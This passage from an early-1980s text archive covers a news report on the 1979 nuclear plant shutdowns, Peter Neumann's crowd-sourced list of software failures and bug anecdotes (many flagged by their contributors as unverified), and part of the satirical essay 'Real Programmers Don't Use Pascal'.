by telephone and asked for a meeting to discuss it. The same day, Energy Secretary James R. Schlesinger was telling Congress that unleaded gas might cost  1 a gallon within a year and service stations might be ordered shut down on Sundays because of oil shortages.     The meeting took place on Thursday, March 8, in Washington with NRC staff, Stone and Webster engineers and Duquesne Light people on hand.     Through the weekend, Stello said, engineers from NRC, Duquesne and Stone and Webster worked at the private firm's Boston office, analyzing the severity of the problem.     ''By the middle of Sunday  March 10  we begin to get a pretty good idea of what it meant for the systems,'' Stello said. ''Monday, we got the latest information from our people at the Stone and Webster offices. It became clear that there would be a number of the safety systems that would have stresses in excess of allowable limits. The magnitude of the excess was considerable.''     Tuesday, members of the NRC were briefed by their staff of engineers and scientists.  They asked for an analysis of the economic impact of the decision, and then ordered the plants closed within 48 hours.     And the five reactors shut down  Duquesne Light Co.'s Beaver Valley plant at Shippingport, Pa.  Maine Yankee in Wiscasset, Maine  the Power Authority of New York's James Fitzpatrick plant at Scriba, N.Y.  and two Virginia and Electric Power Co. reactors at Surry, Va.     It may take months to finish the analysis of the potential problems and even longer to make changes to take care of the situation.     Until the reactors start generating again, the utilities will have to turn to plants using oil or coal. This may cost more, and that cost may be borne by the millions of utility customers.     To replace the power from these nuclear plants could require 100,000 barrels of oil a day or more.  And this at a time when President Carter has promised to cut U.S.  oil consumption by 5 percent   about 1 million barrels a day   and when the world's oil markets are in turmoil because of recent upheavals in Iran.                                   Summary of various problems from NEUMANN SRI AI  Review of Computer Problems    Catastrophes and Otherwise  As a warmup for an appearance on a SOFTFAIR panel on computers and human safety  28 July 1983, Crystal City, VA , and for a new editorial on the need for high quality systems, I decided to look back over previous issues of the ACM SIGSOFT SOFTWARE ENGINEERING NOTES  SEN  and itemize some of the most interesting computer problems recorded. The list of what I found, plus a few others from the top of the head, may be of interest to many of you.  Except for the Garman and Rosen articles, most of the references to SEN  given in the form  SEN Vol No   are to my editorials.

Muni Metro Ghosts   The San Francisco Muni Metro under Market Street has been plagued with problems since its inauguration.  From a software engineering point of view, the most interesting is the Ghost Train problem, in which the signalling system insisted that there was a train outside the Embarcadero Station that was blocking a switch.  Although in reality there was obviously no such train, operations had to be carried on manually, resulting in increasing delays and finally passengers were advised to stay above ground.  This situtation lasted for almost two hours during morning rush hour on 23 May 1983, at which point the nonexistent train vanished as mysteriously as it had appeared in the first place.   The usual collection of mechanical problems also has arisen, including brakes locking, sundry coupling problems, and sticky switches.  There is also one particular switch that chronically causes troubles, and it unfortunately is a weakest link single point of failure that prevents crossover at the end of the line.                          Problems mentioned in the book Software Reliability, Glen Myers  Myers mentions a variety of problems.  One famous one  lot's of  people seem to have heard about it  is the behavior of an early  version of the ballistic missile early warning system in identifying  the rising moon as an incoming missile.  Myers points out that, by  many definitions, this isn't a software error    a problem I discussed  a bit at the beginning of this message.    Other problems mentioned by Myers include various Apollo errors I've  already mentioned, a 1963 NORAD exercise that was incapacitated because   a software error casued the incorrect routing of radar information ,  the loss of the first American Venus probe  mentioned below in more  detail .  Mentioned with citations were an Air Force command system that  was averaging one software failure per day after 12 years in operation,  deaths due to errors in medical software, and a crash causing error  in an aircraft design program.  I was not able to follow up on any of  the citations.    __________________________________ __________________________________  The rest of this message contains excerpts from things I received from  all over, in most cases presented without comments.    __________________________________ __________________________________ faulk nrl css  who got it elsewhere        Today, I heard good story that is a perfect example of the problems that can arise whe the assumptions that one module makes about another are not properly documented.   The story is from a system engineer here  whose father got it from the Smithsonian Space people.       Aparently, the Jupiter    probe to mars could have programs beamed to it which it would load in internal memory.  The system engineers used this property to make mission changes and or corrections.  After the probe had been on Mars for a while, memory started getting tight.  One of the engineers had the realization that they no longer needed the module that controled the landing so the space could be used for something else.  The probe was sent a new program that overwrote the landing module.  As soon as this was accomplished, all contact was lost to the probe.      Looking back into the code to find what had gone wrong, the programmers discovered that because the landing module had to have information on celestial navigation, some or all of the celestial navigation functions were inclded in the landing module.  Unfortunately, the antenna pointing module also required celestial navigation information to keep the antenna pointed at earth.  To do this, it use the navigation functions in the landing module.  Overlaying the module has left the antenna pointing in some unknown direction and all contact with the craft has been lost forever.      Fortunately, all of the mission requirements had been fulfilled so it was no great loss.  It can live on as a great example of bad design.                             mo LBL CSAM   The folklore tells of a bug discovered during the fateful flight of Apollo 13.  It seems that the orbital mechanics trajectory calculation program had a path which had never been excercised because of the smooth, gentle orbital changes characteristic of a nominal Apollo flight.   However, when the flight dynamics team was trying ways to get them home with the aid of much more creative maneuvers, the program promplty crashed with a dump  running on IBM equipment, I believe . The story goes that the fix was simple   something on the order of a missing decimal, or a zero oh reversal,  Divide by zero!!!!!  but there was much consternation and tearing of hair when this critical program bought the farm in the heat of the moment.  This was related to me by an ex NASA employee, but I have heard it through other paths too. I guess the NASA flight investigation summary would be one place to try and verify the details.                               jr bbncd   One cute one was when the Multics swapper out process swapped out the swapper in process.  recall that all of the Multics OS was swappable                                        dan BBN UNIX   Here in Massachusetts we've recently begun testing cars for emissions.  All car inspections are carried out at gas stations, which in order to participate in the program had to buy a spiffy new emissions analyzer which not only told you what your emissions were, but passed judgement on you as well, and kept a recorrd on mag tape which was sent to the Registry of Motor Vehicles so that they could monitor compliance.  Well, on June 1 the owners of the cheaper   8K  of the two acceptable analyzers discovered that their machines could not be used  they didn't like the month of June!  The company which built them, Hamilton, had to apply a quick fix which told the machines that it was actually December  !  .  Lots of people were inconvenienced.  Unfortunately all I know about this at the moment is what the Boston Globe had to say, so I don't know what the actual problem was.  The article said that the quick cure involved replacing the  June  chip with the  December  chip  I don't know what that means, if anything.  Electronic News or Computerworld ought to have more accurate information.  Don't forget about the rocket launch early in the space program which had to be aborted because the Fortran program controlling it believed that the number of seconds in a day was 86400  rather than the sidereal time figure .  The recent issue of Science News with the cover story on when computers make mistakes mentioned a story about a graduate student who almost didn't get his thesis due to inaccuracies in the university computer's floating point software.  Not really earthshaking, except to him, I suppose.                                STERNLIGHT USC ECL   I don't have the data, but there were at least two  almost launches  of missiles.  The rising moon was only one.  You might try contacting Gus Weiss at the National Security Council   he will be able to tell you quite a bit.  Mention my name if you like.     I called Weiss, who didn't have much to say.  He kept repeating  that the problems were fixed  js            mark umcp cs  The following is probably not famous except with me, but deserves to be.  True story   Once upon a time I managed to write a check so that my bank balance went exactly to zero.  This was not so unusual an occurance, as my checking account had an automatic loan feature in case of overdraft, and I used this feature occasionally. Negative and positive balances were therefore well known in this account.  Not so zero balances.  Soon after writing this check I attempted to withdraw some funds using my money machine card.  Unsuccessful.  I attempted to DEPOSIT money via the machine.  Unsuccessful. I talked to a person   they had no record of my account ever having existed.  After several trips to the bank, each time up one more level in the management hierarchy, I, the bank managers and me, discovered the following  The bank's computer had been programmed  so that the way to delete an account was to set the balance to zero.  When I wrote my fatal zeroing check the computer promptly forgot all about me.  Only my passion for paper records, and the bank's paper redundancy, enabled the true story to emerge and my account to be restored.  Interestingly, no funds were ever in danger, since the account was closed with NO MONEY in it.  Nonetheless, the  inconvenience was considerable.  Once the situation became straightened out I immediately transferred my account to another bank, writing a letter to the first bank explaining my reasons for doing so.                                   craig umcp cs  The most famous bug I've ever heard of was in the program which caluclated the orbit for an early Mariner flight to Venus.  Someone changed a   to a   in a Fortran program, and the spacecraft went so wildly off course that it had to be destroyed.                                   fred umcp cs   Some examples of bugs I've heard about but for which I  don't have documentation   a  bug forced a Mercury astronaut  to fly a manual re entry  . . .  There was something about this on the Unix Wizards mailing list a while back. The way I understand it, a programmer forgot that the duration of the Mercury Capsule's orbit had been calculated in siderial time, and left out the appropriate conversion to take into account the rotation of the Earth beneath the capsule. By the end of the mission the Earth had moved several hundred miles from where it ``should'' have been according to the program in question. Sorry I can't give you any definite references to this.                        KROVETZ NLM MCS  I've heard of two bugs that I think are relatively famous   1. A bug in a FORTRAN program that controlled one of the inner planet fly bys     I think it was a fly by of Mercury .  The bug was caused because the    programmer inadvertently said DO 10 I 1.5 instead of DO 10 I 1,5.  FORTRAN    interprets the former as  assign a value of 1.5 to the variable DO10I .  I    heard that as a result the fly by went off course and never did the fly by!    A good case for using variable declarations.   2. I'm not sure where this error cropped up, but one of the earlier versions    of FORTRAN a programmer passed a number as an actual argument  e.g.     CALL MYPROC 2   and within the procedure changed the formal argument.    Since FORTRAN passes arguments by reference this had the result of changing    the constant  2  to something else!  Later versions of FORTRAN included a    check for changing an argument when the actual is an expression.                                        uvicctr!dparnas   From jhart  Thu Jun  9 13 30 48 1983 To  parnas  San Fransisco Bay Area Rapid Transit, reported in Spectrum about two years ago.

One morning, when they booted, years ago, the operators on the Math faculty's time sharing system set the date at December 7th, 1941  ie Pearl Harbor .  Well the spouse of the director of the MFCF  ie Math Faculty Computing Facility  signed on, was annoyed by this, and changed the date to the actual date.  Everyone who was signed on while this was done was charged for thirty something years of connect time. I wouldn't know how to document this story.  Oh yes, didn't Donn Parker, self proclaimed computer sleuth, call the fuss made over UNIX and intelligent terminals some outrageous phrase, like 'The bug of the century'   I am refering to the fuss made over the fact that some of the terminals that berkeley had bought were sufficiently intelligent, that they would do things on the command of the central system.   The danger was that if someone was signed on to one of these terminals as root, an interloper could write something to this terminal causing the terminal to silently transmit a string back to UNIX.  Potentially, this string could contain a command line giving the interloper permissions to which they were not entitled.

Unfortunately it is a rumor that I I haven't tried to verify. Recall that FORTRAN was developed on the IBM 704.  One of the 704's unusual features was that core storage used signed magnitude, the arithmatic unit used 2's complement, and the index regesters used 1's complement.  When FORTRAN was implemented on the IBM product that replaced the 704, 7094 etc. series, the 3 way branching if went to the wrong place when testing negative zero.  It branched negative, as opposed to branhing to zero .  I heard this rumor from Pat Eberlein  eberlein buffalo . Supposedly, the bug wasn't fixed  or descovered  for two years.                               VES KESTREL  1. In the mid 70's in a lumber provessing plant in Oregon a program was  controlling the cutting of logs into boards and beams.  The program included   an algorithm for deciding the most efficient way to cut the log  in terms of utilizing most of the wood , but also controlled the speed with which the log  was advancing.     Once the speed of a log increased to dangerous levels.  All personnel was scattered and chased out of the building, the log jumped off the track, fortunately there were no casualties.  This was caused by a software bug. A reference to the event would be the former director of the Computer Center at Oregon State University  prior to 1976 , who at the time I heard the story  Spring 1977  was President of the company which developed the software.    2.  Abother rather amusing incident dates back to the mid 60's.  It was not caused by a software bug but is indicative of the vulnerability of software systems particularly in those early days.  It involved the Denver office of Arizona airlines.  Their reservation system was periodically getting garbage input.  Software experts were dispatched but failed to identify the cause.  Finally the software manager of the company which developed the system went to study the problem on the spot.   After spending a week at the site he managed to identify a pattern in the generation of garbage input  it was happening only during the shifts  of a paticular operator and only when coffie was served to her.  Shortly afterwards the cause was pinpointed.  The operator was a voluminous lady  with a large belly.  The coffie pot was placed behind the terminal and  when she would reach for it her belly would rest on the keyboard.  Unfortuna  tely, I don't have more exact references to that event.                               RWK at SCRC TENEX  There's the famous phase of the moon bug which struck  I believe  Gerry Sussman and Guy Steele, then both of MIT.  It turned out to be due to code which wrote a comment into a file of LISP forms, that included the phase of the moon as part of the text.  At certain times of the month, it would fail, due to the comment line being longer than the  page width   they had failed to turn off automatic newlines that were being generated by Maclisp when the page width was exceeded.  Thus the last part of the line would be broken onto a new line, not proceeded with a      the comment character .  When reading the file back in, an error would result.                                   gwyn brl vld  An early U.S. Venus probe  Mariner   missed its target immensely due to a Fortran coding error of the following type   DO 10 I 1.100  Which should have been  DO 10 I 1,100  The first form is completely legal  it default allocates a REAL variable DO10I and assigns 1.1 to it!                                        Horning.pa PARC MAXC  I have heard from various sources  but never seen in print  the story that the problem with the wings of the Lockheed Electras  that caused several fatal crashes  slipped past the stress analysis program because of an undetected overflow. This one would probably be next to impossible to document.  One of my favorite bugs isn't all that famous, but is instructive. In about 1961, one of my classmates  Milton Barber  discovered that the standard integer binary to decimal routine provided by Bendix for the G 15D computer wasn't always exact, due to accumulated error from short multiplications. This only affected about one number in 26,000, but integer output OUGHT to be exact. The trick was to fix the problem without using any additional drum locations or drum revoltions. This occupied him for some time, but he finally accomplished it. His new routine was strictly smaller and faster. But was it accurate  Milton convinced himself by numerical analysis that it would provide the correct answer for any number of up to seven digits  one word of BCD . Just to be safe, he decided to test it exhaustively. So he wrote a loop that counted in binary and in BCD, converted the binary to BCD, and compared the results. On the G 15D this ran at something like 10 numbers per second. For several weeks, Milton took any otherwise idle time on the college machine, until his loop had gone from 0 to 10  7 1 without failure. The he proudly submitted his routine to Bendix, which duly distributed it to all users. Soon thereafter, he got a telephone call   Are you aware that your binary to decimal conversion routine drops the sign on negative numbers   This is the most exhaustive program test that I've ever seen, yet the program failed on half its range!              Horning.pa   Excerpts from a trip report by Dr. T. Anderson of the University of Newcastle upon Tyne.   The purpose of my trip was to attend a subworking group meeting on the production of reliable software, sponsored by NASA, chaired by John Knight  University of Virginia , and organized and hosted by the Research Triangle Institute  Nov. 3 4, 1981 . Essentially, NASA would like to know how on earth software can be produced which will conform to the FAA reliability standards of 10  9 failures hour. Sadly, no one knew.  FRANK DONAGHE  IBM FEDERAL SYSTEMS DIVISION   PRODUCING RELIABLE SOFTWARE FOR THE SPACE SHUTTLE  Software for the Space Shuttle consists of about 1 2 million lines of code, produced by a team which at its largest had about 400 members. Costs were high at about  400 per line. . . . Between the first and second flight 80  of the mdoules were changed, such that about 20  of the code was replaced. Three weeks prior to the second flight a bug in the flight software was detected which tied up the four primary computers in a tight  two instruction  loop. .              Laws SRI AI  Don't forget the bug that sank the Sheffield in the Argentine war.  The shipboard computer had been programmed to ignore Exocet missiles as  friendly.   I might be able to dig up an IEEE Spectrum reference, but it is not a particularly good source to cite.  The bug has been widely reported in the news media, and I assume that Time and Newsweek must have mentioned it.  I'll try to find the reference, but I must issue a disclaimer  some of my SRI associates who monitor such things more closely than I  but still without inside information  are very suspicious of the  bug  explanation.   Computer error  is a very easy way to take the heat off, and to cover what may have been a tactical error  e.g., turning off the radar to permit some other communication device to function  or a more serious flaw in the ship's defensive capability.          PARK SRI AI   From International Defense Review and New Scientist after the Falklands war ...  The radar system on the Sheffield that didn't report the incoming Exocet missile because it wasn't on the list of missiles that it expected a Russian ship to use.  The missiles fired over the heads of British troops on the Falklands beaches at the Argentinians, that could have gone off if they had detected enough metal below them  probably not really software .  The missile that was guided by a person watching a tv picture of the missile from a shipboard camera.  A flare on the tail of the missile intended to  make the missile more visible to the camera tended to obscure the target. A hasty software mod made the missile fly 20 feet higher  lower   so that the operator could see the target.  A more general consideration is that in the event of an electromagnetic pulse's deactivating large numbers of electronic systems, one would prefer that systems like missiles in the air fail safe.                                   Laws SRI AI  I have scanned Spectrum's letters column since the original Exocet mention in Oct. '82, but have not found any mention of the bug.  Perhaps I read the item on the AP newswire or saw a newspaper column posted on a bulletin board here at SRI. Possibly Garvey SRI AI could give you a reference.  Sorry.                       Garvey SRI AI Subject  Re  Falkland Islands Bug   The original source  as far as I know  was an article in  New Scientist  a British magazine  on 10 Feb 83.  It suggested that the Exocet was detected by the Sheffield's ESM gear, but catalogued as a friendly  !  missile, so no action was taken.  I have two, strictly personal  i.e., totally unsubstantiated by any facts or information whatsoever  thoughts about this   1  I suspect the article is a bit of disinformation to cover up other failings in the overall system  from bits and pieces and rumors, I would give top billing to the possibility of poor spectrum management as the culprit   2  I wouldn't care if the missile had the Union Jack on the nose and were humming Hail Brittania, if it were headed for me, I would classify it as hostile!  ______________  PALMER SCRC TENEX   I was working for a major large computer manufacturer  not the one that employees me today .  One of the projects I handled was an RPG compiler that was targeted to supporting customers that were used to IBM System III systems.  There had been complaints about speed problems from the field on RPG programs that used a table lookup instruction.  The computer supporting the compiler had excellent micorocde features   we decided to take advantage of the feature by microcoding the capability into the basic machine.    The feature was pretty obvious  it would search for things in ordered or unordered tables and do various things depending on whether the key was in the table.  We made what we considered to be the  obvious  optimization in the case of ordered tables   we performed a binary search.  Nothing could be faster given the way the tables were organized.  We wrote the code, tested it on our own test cases and some field examples and got performance improvements exceeding sales requirements.  It was an important fix...  Unfortunatly, it was wrong.  It isn't clear what  it  was in this case   Us or IBM.  People loaded their tables in the machine with each run of an RPG program and they often wouldn't bother to keep their ordered tables ordered.  IBM didn't care   it ignored the specification  most of the time .  Our code would break when people gave us bad data in ways that IBM's wouldn't.  We had to fix ours.                                    Olmstread.PA PARC MAXC  I can't supply any documentation, but I was told when I was in school with Ron Lachman  you might want to check with him at LAI    laidback!ron, I think  that IBM had a bug in its program IEFBR14.

From  ihnp4!zehntel!zinfandel!berry ucb vax  In the April 1980 issue of ACM SIGSOFT Software Engineering Notes, editor Peter G. Neumann  NEUMANN SRI KL at that time  relays information that Earl Boebert got from Mark Groves  OSD R E  regarding bugs in the software of the F 16 fighter.  Apparently a problem in the navigation  software inverted the aircraft whenever it corssed the equator.  Luckily it was caught early in simulation testing and promptly fixed.   In the July issue, J.N. Frisina at Singer Kearfott wrote to Mr. Neumann,  concerned that readers might have mistakenly believed there was a bug in the flight software, which was of course not the case.   At least they fixed THAT  one.  Wasn't it Hoare who said that acceptance testing is just an unsuccessful attempt to find bugs    Mr. Frisina wrote       In the current search for reliable software, the F16 Navigation     software is an example of the high degree of reliability and quality     that can be obtained with the application of proper design verification     and testing methodologies.  All primary misison functions were software     correct.      In the April '81 Issue it is revealed that the F18 range of control travel  limits imposed by the F18 software are based on assumptions about the  inability of the aircraft to get into certain attitudes.  Well, some of these 'forbidden' attitudes are in fact attainable.  Apparently so much effort had gone design and testing of the software that it is now preferable to modify the aircraft to fit the software, rather than vice versa!          Cantone nrl aic  I've heard from Prof. Martin Davis, a logician at NYU, that Turing's  Ph.D. thesis was just filled with bugs.  His thesis was a theoretical  description of his Turing machine that included sample computer  programs for it.  It was these programs that were filled with bugs.   Without computers there was no way to check them.    Those programs could have worked with only minor fixes .    NOTE  I called Davis, who gave as a reference a paper by Emile Post on  recursive unsolvability that appeared in 1947 8 in the Journal of  Symbolic Logic    js                          David.Smith CMU CS IUS  In simulation tests between the first and second Shuttle flights, a bug was found in the onboard computer software, which could have resulted in  the premature jettison of ONE of the SRB's.  That would have been the  world's most expensive pinwheel!

We work with some collection system software that was initially deployed in 1974.  Part of the system calculated the times of upcoming events. In 1976, on February 29th, some parts of the system thought it was a different julian day and it basically broke the  whole system.  Several subroutines needed leap year fixes.  One  software engineer was called in from home and worked all night on that one.  How many sound Software Engineering Principles were violated                                 Stachour.CSCswtec HI MULTICS    while i cannot cite any published documentation, and this could hardly qualify as a famous bug, a mail system I once worked on  which ran with priviledge to write into any one mailboxes  was discovered to have an incorrect check for message length froma message coming from a file. The result was that a 'specially prepared msg' could arrange to overlay the test of the mail system, and especilly restore the system 'change access' program on top of the mail system, which then gave the caller power to change access controls on any file of the system.   This was for a university built mail system for a HOneywell GCOS3 ciria 1976.                       Sibert MIT MULTICS   I imagine you've heard about this already, and, if not, I can't provide any documentation, but anyway  it is said that the first Mariner space probe, Mariner 1, ended up in the Atlantic instead of around Venus because someone omitted a comma in a guidance program.                             Kyle.wbst PARC MAXC  TRW made a satellite in the late '50's or early '60's with the feature that it could power down into a stand by mode to conserve electrical consumption. On the first pass over the cape  after successful orbital check out of all systems , the ground crew transmitted the command to power down. On the next pass, they transmitted the command to power up and nothing happened because the software hardware system on board the satellite shut EVERYTHING down  including the ground command radio receiver .                               Hoffman.es PARC MAXC   From the AP story carried on Page 1 of today's Los Angeles Times    Jet Engine Failure Tied to Computer   It's Too Efficient  The efficiency of a computer aboard a United Airlines 767 jet may have led to the failure of both of the plane's engines, forcing the aircraft into a four minute powerless glide on its approach to Denver, federal officials said Tuesday. . . .  The National Transportation Safety Board's  investigation has disclosed that the overheating problem stemmed from the accumulation of ice on the engines. . . .  I t is believed that the ice built up because the onboard computer had the aircraft operating so efficiently during the gradual descent that the engines were not running fast enough to keep the ice from forming. . . . The incident raised questions among aviation safety experts about the operation of the highly computerized new generation of jetliners that are extremely fuel efficient because of their design and computerized systems.  The question is at what point should you averride the computer,  one source close to the inquiry said. . . .  T he engines normally would have been running fast enough to keep the ice from forming.  In the case of Flight 310, investigators believe, the computer slowed the engine to a rate that conserved the maximum amount of fuel but was too slow to prevent icing. A key question, one source said, is whether the computer controlled descent might have kept the flight crew from recognizing the potential icing problem.  Airline pilots for some time have complained that the highly computerized cockpits on the new jets    such as the 767, Boeing's 757 and the Airbus 310    may make pilots less attentive. . . .  __________________  Kaehler.pa parc maxc Info Kermit COLUMBIA 20  On Wednesday, August 24, at 11 53 51 EDT, KERMIT 20 stopped working on many TOPS 20 systems.  The symptom was that after a certain number of seconds  KERMIT 20's timeout interval , the retry count would start climbing rapidly, and then the transfer would hang.  The problem turns out to be a  time bomb  in TOPS 20.  Under certain conditions  i.e. on certain dates, provided the system has been up more than a certain number of hours , the timer interrupt facility stops working properly. If KERMIT 20 has stopped working on your system, just reload the system and the problem will go away.  Meanwhile, the systems people at Columbia have developed a fix for the offending code in the monitor and have distributed it to the TOPS 20 managers on the ARPAnet.  The problem is also apparent in any other TOPS 20 facility that uses timers, such as the Exec autologout code.

During this period, the Real Men were the ones that understood computer programming, and the Quiche Eaters were the ones that didn't.  A real computer programmer said things like  DO 10 I 1,10  and  ABEND   they actually talked in capital letters, you understand , and the rest of the world said things like  computers are too complicated for me  and  I can't relate to computers    they're so impersonal .  A previous work  1  points out that Real Men don't  relate  to anything, and aren't afraid of being impersonal.    But, as usual, times change. We are faced today with a world in which little old ladies can get computers in their microwave ovens, 12 year old kids can blow Real Men out of the water playing Asteroids and Pac Man, and anyone can buy and even understand their very own Personal Computer.  The Real Programmer is in danger of becoming extinct, of being replaced by high school students with TRASH 80's.   There is a clear need to point out the differences between the typical high school junior Pac Man player and a Real Programmer. If this difference is made clear, it will give these kids something to aspire to    a role model, a Father Figure. It will also help explain to the employers of Real Programmers why it would be a mistake to replace the Real Programmers on their staff with 12 year old Pac Man players  at a considerable salary savings .                            LANGUAGES                                      The easiest way to tell a Real Programmer from the crowd is by the programming language he  or she  uses. Real Programmers use FORTRAN.  Quiche Eaters use PASCAL. Nicklaus Wirth, the designer of PASCAL, gave a talk once at which he was asked  How do you pronounce your name  . He replied,  You can either call me by name, pronouncing it 'Veert', or call me by value, 'Worth'.   One can tell immediately from this comment that Nicklaus Wirth is a Quiche Eater. The only parameter passing mechanism endorsed by Real Programmers is call by value return, as implemented in the IBM 370 FORTRAN G and H compilers.  Real programmers don't need all these abstract concepts to get their jobs done    they are perfectly happy with a keypunch, a FORTRAN IV compiler, and a beer.       Real Programmers do List Processing in FORTRAN.       Real Programmers do String Manipulation in FORTRAN.       Real Programmers do Accounting  if they do it at all  in FORTRAN.       Real Programmers do Artificial Intelligence programs in FORTRAN.  If you can't do it in FORTRAN, do it in assembly language.  If you can't do it in assembly language, it isn't worth doing.          Real Programmers...  p. 2                      STRUCTURED PROGRAMMING                                             The academics in computer science have gotten into the  structured programming  rut over the past several years. They claim that programs are more easily understood if the programmer uses some special language constructs and techniques. They don't all agree on exactly which constructs, of course, and the examples they use to show their particular point of view invariably fit on a single page of some obscure journal or another    clearly not enough of an example to convince anyone. When I got out of school, I thought I was the best programmer in the world. I could write an unbeatable tic tac toe program, use five different computer languages, and create 1000 line programs that WORKED.   Really!  Then I got out into the Real World. My first task in the Real World was to read and understand a 200,000 line FORTRAN program, then speed it up by a factor of two. Any Real Programmer will tell you that all the Structured Coding in the world won't help you solve a problem like that    it takes actual talent. Some quick observations on Real Programmers and Structured Programming        Real Programmers aren't afraid to use GOTO's.       Real Programmers can write five page long DO loops without      getting confused.       Real Programmers like Arithmetic IF statements    they make the      code more interesting.       Real Programmers write self modifying code, especially if they      can save 20 nanoseconds in the middle of a tight loop.       Real Programmers don't need comments    the code is obvious.       Since FORTRAN doesn't have a structured IF, REPEAT ... UNTIL, or      CASE statement, Real Programmers don't have to worry about not      using them. Besides, they can be simulated when necessary using      assigned GOTO's.   Data Structures have also gotten a lot of press lately. Abstract Data Types, Structures, Pointers, Lists, and Strings have become popular in certain circles. Wirth  the above mentioned Quiche Eater  actually wrote an entire book  2  contending that you could write a program based on data structures, instead of the other way around. As all Real Programmers know, the only useful data structure is the Array. Strings, lists, structures, sets    these are all special cases of arrays and can be treated that way just as easily without messing up your programing language with all sorts of complications. The worst thing about fancy data types is that you have to declare them, and Real Programming Languages, as we all know, have implicit typing based on the first letter of the  six character  variable name.          Real Programmers...  p. 3                        OPERATING SYSTEMS                                          What kind of operating system is used by a Real Programmer  CP M  God forbid    CP M, after all, is basically a toy operating system.  Even little old ladies and grade school students can understand and use CP M.   Unix is a lot more complicated of course    the typical Unix hacker never can remember what the PRINT command is called this week    but when it gets right down to it, Unix is a glorified video game. People don't do Serious Work on Unix systems  they send jokes around the world on UUCP net and write adventure games and research papers.   No, your Real Programmer uses OS 370. A good programmer can find and understand the description of the IJK305I error he just got in his JCL manual.  A great programmer can write JCL without referring to the manual at all.  A truly outstanding programmer can find bugs buried in a 6 megabyte core dump without using a hex calculator.   I have actually seen this done.    OS is a truly remarkable operating system. It's possible to destroy days of work with a single misplaced space, so alertness in the programming staff is encouraged. The best way to approach the system is through a keypunch.  Some people claim there is a Time Sharing system that runs on OS 370, but after careful study I have come to the conclusion that they were mistaken.                        PROGRAMMING TOOLS                                          What kind of tools does a Real Programmer use  In theory, a Real Programmer could run his programs by keying them into the front panel of the computer.  Back in the days when computers had front panels, this was actually done occasionally.  Your typical Real Programmer knew the entire bootstrap loader by memory in hex, and toggled it in whenever it got destroyed by his program.  Back then, memory was memory    it didn't go away when the power went off. Today, memory either forgets things when you don't want it to, or remembers things long after they're better forgotten.  Legend has it that Seymore Cray, inventor of the Cray I supercomputer and most of Control Data's computers, actually toggled the first operating system for the CDC7600 in on the front panel from memory when it was first powered on.  Seymore, needless to say, is a Real Programmer.   One of my favorite Real Programmers was a systems programmer for Texas Instruments.  One day he got a long distance call from a user whose system had crashed in the middle of saving some important work. Jim was able to repair the damage over the phone, getting the user to toggle in disk I O instructions at the front panel, repairing system tables in hex, reading register contents back over the phone. The moral of this story  while a Real Programmer usually includes a keypunch and lineprinter in his toolkit, he can get along with just a front panel and a telephone in emergencies.          Real Programmers...  p. 4   In some companies, text editing no longer consists of ten engineers standing in line to use an 029 keypunch. In fact, the building I work in doesn't contain a single keypunch. The Real Programmer in this situation has to do his work with a  text editor  program.  Most systems supply several text editors to select from, and the Real Programmer must be careful to pick one that reflects his personal style.  Many people believe that the best text editors in the world were written at Xerox Palo Alto Research Center for use on their Alto and Dorado computers  3 .  Unfortunately, no Real Programmer would ever use a computer whose operating system is called SmallTalk, and would certainly not talk to the computer with a mouse.   Some of the concepts in these Xerox editors have been incorporated into editors running on more reasonably named operating systems    EMACS and VI being two.  The problem with these editors is that Real Programmers consider  what you see is what you get  to be just as bad a concept in Text Editors as it is in women.  No the Real Programmer wants a  you asked for it, you got it  text editor    complicated, cryptic, powerful, unforgiving, dangerous. TECO, to be precise.   It has been observed that a TECO command sequence more closely resembles transmission line noise than readable text  4 .  One of the more entertaining games to play with TECO is to type your name in as a command line and try to guess what it does.  Just about any possible typing error while talking with TECO will probably destroy your program, or even worse    introduce subtle and mysterious bugs in a once working subroutine.   For this reason, Real Programmers are reluctant to actually edit a program that is close to working.  They find it much easier to just patch the binary object code directly, using a wonderful program called SUPERZAP  or its equivalent on non IBM machines .  This works so well that many working programs on IBM systems bear no relation to the original FORTRAN code.  In many cases, the original source code is no longer available.  When it comes time to fix a program like this, no manager would even think of sending anything less than a Real Programmer to do the job    no Quiche Eating structured programmer would even know where to start.  This is called  job security .   Some programming tools NOT used by Real Programmers        FORTRAN preprocessors like MORTRAN and RATFOR. The Cuisinarts of      programming    great for making Quiche. See comments above on      structured programming.       Source language debuggers. Real Programmers can read core dumps.       Compilers with array bounds checking. They stifle creativity,      destroy most of the interesting uses for EQUIVALENCE, and make it      impossible to modify the operating system code with negative      subscripts. Worst of all, bounds checking is inefficient.       Source code maintenance systems. A Real Programmer keeps his code      locked up in a card file, because it implies that its owner      cannot leave his important programs unguarded  5 .            Real Programmers...  p. 5                   THE REAL PROGRAMMER AT WORK                                               Where does the typical Real Programmer work  What kind of programs are worthy of the efforts of so talented an individual   You can be sure that no Real Programmer would be caught dead writing accounts receivable programs in COBOL, or sorting mailing lists for People magazine.  A Real Programmer wants tasks of earth shaking importance  literally! .       Real Programmers work for Los Alamos National Laboratory, writing      atomic bomb simulations to run on Cray I supercomputers.       Real Programmers work for the National Security Agency, decoding      Russian transmissions.       It was largely due to the efforts of thousands of Real      Programmers working for NASA that our boys got to the moon and      back before the Russkies.       Real Programmers are at work for Boeing designing the operating      systems for cruise missiles.   Some of the most awesome Real Programmers of all work at the Jet Propulsion Laboratory in California. Many of them know the entire operating system of the Pioneer and Voyager spacecraft by heart.  With a combination of large ground based FORTRAN programs and small spacecraft based assembly language programs, they are able to do incredible feats of navigation and improvisation    hitting ten kilometer wide windows at Saturn after six years in space, repairing or bypassing damaged sensor platforms, radios, and batteries.  Allegedly, one Real Programmer managed to tuck a pattern matching program into a few hundred bytes of unused memory in a Voyager spacecraft that searched for, located, and photographed a new moon of Jupiter.   The current plan for the Galileo spacecraft is to use a gravity assist trajectory past Mars on the way to Jupiter.  This trajectory passes within 80    3 kilometers of the surface of Mars. Nobody is going to trust a PASCAL program  or a PASCAL programmer  for navigation to these tolerances.   As you can tell, many of the world's Real Programmers work for the U.S.  Government    mainly the Defense Department.  This is as it should be.  Recently, however, a black cloud has formed on the Real Programmer horizon.  It seems that some highly placed Quiche Eaters at the Defense Department decided that all Defense programs should be written in some grand unified language called  ADA    C , DoD .  For a while, it seemed that ADA was destined to become a language that went against all the precepts of Real Programming    a language with structure, a language with data types, strong typing, and semicolons. In short, a language designed to cripple the creativity of the typical Real Programmer.  Fortunately, the language adopted by DoD has enough interesting features to make it approachable    it's incredibly complex, includes methods for messing with the operating system and rearranging memory, and Edsgar Dijkstra doesn't like it  6 .  Dijkstra, as I'm sure you know, was the author of  GoTos Considered 